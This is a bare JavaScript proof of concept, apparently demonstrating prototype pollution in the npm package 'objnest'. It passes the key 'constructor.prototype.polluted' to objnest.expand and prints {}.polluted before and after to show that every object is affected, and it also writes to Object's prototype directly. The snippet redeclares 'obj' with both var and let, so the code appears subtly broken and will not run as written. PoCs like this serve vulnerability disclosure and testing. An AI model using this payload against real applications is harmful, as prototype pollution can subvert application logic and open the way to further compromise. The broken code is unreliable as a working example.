var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const objnest = require('objnest');
let obj = {};
console.log({}.polluted);
objnest.expand({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);